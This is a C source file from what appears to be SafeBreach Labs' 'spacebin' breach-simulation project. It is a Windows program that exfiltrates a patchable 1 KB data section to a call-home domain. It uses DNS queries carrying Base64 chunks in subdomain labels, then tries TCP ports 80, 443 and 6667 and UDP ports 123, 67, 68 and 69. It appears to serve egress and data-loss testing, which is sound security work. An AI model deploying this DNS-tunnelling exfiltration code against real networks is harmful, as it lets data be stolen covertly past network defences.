/**************************************************************************
*                                                                         *
* Copyright (c) 2016, SafeBreach                                          *
* All rights reserved.                                                    *
*                                                                         *
* Redistribution and use in source and binary forms, with or without      *
* modification, are permitted provided that the following conditions are  *
* met:                                                                    *
*                                                                         *
*  1. Redistributions of source code must retain the above                *
* copyright notice, this list of conditions and the following             *
* disclaimer.                                                             *
*                                                                         *
*  2. Redistributions in binary form must reproduce the                   *
* above copyright notice, this list of conditions and the following       *
* disclaimer in the documentation and/or other materials provided with    *
* the distribution.                                                       *
*                                                                         *
*  3. Neither the name of the copyright holder                            *
* nor the names of its contributors may be used to endorse or promote     *
* products derived from this software without specific prior written      *
* permission.                                                             *
*                                                                         *
* THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS                      *
* AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES,         *
* INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF                *
* MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.    *
* IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR    *
* ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL  *
* DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE       *
* GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS           *
* INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER    *
* IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR         *
* OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF  *
* ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.                              *
*                                                                         *
***************************************************************************/


/**
* @file: binsatellite.c
* @author: Itzik Kotler
* @see: https://github.com/SafeBreach-Labs/spacebin
*/

// Writeable Section Delimiter

#ifndef MAGICNUMBER
#define MAGICNUMBER ".oO"
#endif

// Writeable Section Size

#ifndef WRITEABLE_SECTION_SIZE
#define WRITEABLE_SECTION_SIZE 1023
#endif

// Call-Home Domain name

#ifndef DESTINATION_DOMAIN
#define DESTINATION_DOMAIN "argcargvenvp.com"
#endif

// Call-home Hostname

#ifndef DESTINATION_HOSTNAME
#define DESTINATION_HOSTNAME "ns1." DESTINATION_DOMAIN
#endif

// Maximum leaked bytes per DNS request (before Base64 Expansion)!

#ifndef MAX_CHUNK_SIZE
#define MAX_CHUNK_SIZE 40
#endif

// Maximum Total DNS request size

#ifndef MAX_REQUEST_SIZE
#define MAX_REQUEST_SIZE 255
#endif

// Sequence of TCP ports to test connectivity

#ifndef TEST_TCP_PORTS
#define TEST_TCP_PORTS {80, 443, 6667}
#endif

// Sequence of UDP ports to test connectivity

#ifndef TEST_UDP_PORTS
#define TEST_UDP_PORTS {123, 67, 68, 69}
#endif

#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <windows.h>
#include <wincrypt.h>
#include <stdlib.h>
#include <tchar.h>
#include <lmcons.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "crypt32.lib")

LPSTR Base64Encode(const BYTE *pbBinary, DWORD cbBinary) {
	DWORD dwEncodedBinarySize;
	BOOL bRetVal;
	LPSTR pszEncodedBinary;

	bRetVal = CryptBinaryToStringA(
		pbBinary,
		cbBinary,
		CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
		NULL,
		&dwEncodedBinarySize
	);

	if (!bRetVal)
		return NULL;

	pszEncodedBinary = (LPSTR)malloc(dwEncodedBinarySize);

	if (!pszEncodedBinary)
		return NULL;

	bRetVal = CryptBinaryToStringA(
		pbBinary,
		cbBinary,
		CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
		pszEncodedBinary,
		&dwEncodedBinarySize
	);

	return pszEncodedBinary;
}

PHOSTENT OverUDPAndDNS(char *s, DWORD len, DWORD pid) {
	static int iMessageSeqNumber = 0;
	int iChunkSize, iEncodedChunkSize;
	char szChunk[MAX_CHUNK_SIZE];
	char szDNSName[MAX_REQUEST_SIZE];
	PHOSTENT remoteHost;
	LPSTR pszBase64EncodedChunk;

	iChunkSize = MAX_CHUNK_SIZE;

	for (int j = 0; j < len; j += iChunkSize) {
		if ((j + iChunkSize) > len)
			iChunkSize = len - j;

		// Encode Chunk
		SecureZeroMemory(&szChunk, sizeof(szChunk));
		strncpy(szChunk, s + j, iChunkSize);

		pszBase64EncodedChunk = Base64Encode((BYTE *)szChunk, iChunkSize);
		iEncodedChunkSize = strlen(pszBase64EncodedChunk);

		// Transform Base64 to "Safe Base64" for DNS:
		//     '+' -> _
		//     '/' -> -
		//     '=' -> 0x0

		for (int x = 0; x <iEncodedChunkSize; x++) {
			switch (pszBase64EncodedChunk[x]) {
			case '+':
				pszBase64EncodedChunk[x] = '_';
				break;
			case '/':
				pszBase64EncodedChunk[x] = '-';
				break;
			case '=':
				pszBase64EncodedChunk[x] = 0x00;
				break;
			}
		}

		SecureZeroMemory(&szDNSName, sizeof(szDNSName));
		snprintf(szDNSName, MAX_REQUEST_SIZE, "i%d.p%d.%s.%s", iMessageSeqNumber++, pid, pszBase64EncodedChunk, DESTINATION_DOMAIN);

		// Generate DNS Request
		remoteHost = gethostbyname(szDNSName);

		// Clean-up Encoded Chunk
		free((VOID *)pszBase64EncodedChunk);
	}

	return remoteHost;
}

SOCKET CreateTCPSocket(LPSTR name, DWORD port) {
	LPHOSTENT hostEntry;
	SOCKADDR_IN serverInfo;
	SOCKET conn;
	int iRetval;

	hostEntry = gethostbyname(name);

	if (!hostEntry)
		return INVALID_SOCKET;

	conn = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (conn == INVALID_SOCKET)
		return INVALID_SOCKET;

	SecureZeroMemory(&serverInfo, sizeof(serverInfo));
	serverInfo.sin_family = AF_INET;
	serverInfo.sin_addr = *((LPIN_ADDR)*hostEntry->h_addr_list);
	serverInfo.sin_port = htons(port);

	iRetval = connect(conn, (LPSOCKADDR)&serverInfo, sizeof(struct sockaddr));

	if (iRetval == SOCKET_ERROR)
		return INVALID_SOCKET;

	return conn;
}

SOCKET CreateUDPSocket(LPSTR name, DWORD port, PSOCKADDR_IN serverInfo) {
	LPHOSTENT hostEntry;
	SOCKET conn;

	hostEntry = gethostbyname(name);

	if (!hostEntry)
		return INVALID_SOCKET;

	conn = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

	if (conn == INVALID_SOCKET)
		return INVALID_SOCKET;

	SecureZeroMemory(serverInfo, sizeof(serverInfo));
	serverInfo->sin_family = AF_INET;
	serverInfo->sin_addr = *((LPIN_ADDR)*hostEntry->h_addr_list);
	serverInfo->sin_port = htons(port);

	return conn;
}

int main(int argc, char **argv, char **envp) {
	WSADATA wsaData;
	int iRetVal;
	int aTcpPorts[] = TEST_TCP_PORTS;
	int aUdpPorts[] = TEST_UDP_PORTS;
	DWORD dwProcessID;

	// MAGICNUMBER <1024 BYTES> MAGICNUMBER
	// NOTE: Without `volatile`, CL optimization breaks and psWriteableSection acts crazy (i.e. strlen() will report partial length, but printf() will print the whole string)
	volatile LPSTR psWriteableSection = MAGICNUMBER "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" MAGICNUMBER;

	// Initialize Winsock
	iRetVal = WSAStartup(MAKEWORD(2, 2), &wsaData);

	if (iRetVal != NO_ERROR) {
		printf("WSAStartup function failed with error: %d\n", iRetVal);
		return 0;
	}

	/*
	* Order of Tests:
	* ===============
	*
	* 1. Try DNS (UDP)
	* 1.1. Dump psWriteableSection using Base64 "DNS Safe" Encoding
	* 2. Try TCP
	* 2.1. For each PORT in aTcpPort (i.e. TEST_TCP_PORTS)
	* 2.1.1. Dump psWriteableSection using ASCII Encoding
	* 3. Try UDP
	* 3.1. For each PORT in aUdpPort (i.e. TEST_UDP_PORTS)
	* 3.1.1. Dump psWriteableSection using ASCII Encoding
	*/

	// Every DNS request is prefixed with `p<PROCESS_ID>`
	dwProcessID = GetCurrentProcessId();

	printf("HELLO WORLD 123: %s (%d bytes)\n", psWriteableSection, strlen(psWriteableSection));

	printf("TRYING OverUDPAndDNS ...\n");
	// Try to dump `psWriteableSection' over DNS
	OverUDPAndDNS(psWriteableSection, strlen(psWriteableSection), dwProcessID);
	OverUDPAndDNS("\n", 1, dwProcessID);

	// Try to connect over TCP
	for (int i = 0; i < sizeof(aTcpPorts) / sizeof(int); i++) {
		SOCKET s = CreateTCPSocket(DESTINATION_HOSTNAME, aTcpPorts[i]);
		char szOutboundBuffer[WRITEABLE_SECTION_SIZE];

		if (s == INVALID_SOCKET)
			continue;

		SecureZeroMemory(&szOutboundBuffer, sizeof(szOutboundBuffer));
		snprintf(szOutboundBuffer, sizeof(szOutboundBuffer), "%s", psWriteableSection);

		printf("TRYING %d/TCP ...\n", aTcpPorts[i]);

		// Send `psWriteableSection`
		send(s, szOutboundBuffer, strlen(szOutboundBuffer), 0);

		closesocket(s);
	}

	// Try to connect over UDP
	for (int i = 0; i < sizeof(aUdpPorts) / sizeof(int); i++) {
		SOCKADDR_IN serverInfo;
		SOCKET s = CreateUDPSocket(DESTINATION_HOSTNAME, aUdpPorts[i], &serverInfo);
		char szOutboundBuffer[WRITEABLE_SECTION_SIZE];

		if (s == INVALID_SOCKET)
			continue;

		SecureZeroMemory(&szOutboundBuffer, sizeof(szOutboundBuffer));
		snprintf(szOutboundBuffer, sizeof(szOutboundBuffer), "%s", psWriteableSection);

		printf("TRYING %d/UDP ...\n", aUdpPorts[i]);

		// Send `psWriteableSection`
		sendto(s, szOutboundBuffer, strlen(szOutboundBuffer), 0, (PSOCKADDR)&serverInfo, sizeof(serverInfo));

		closesocket(s);
	}

	// Clean-up
	WSACleanup();

	return 1;
}
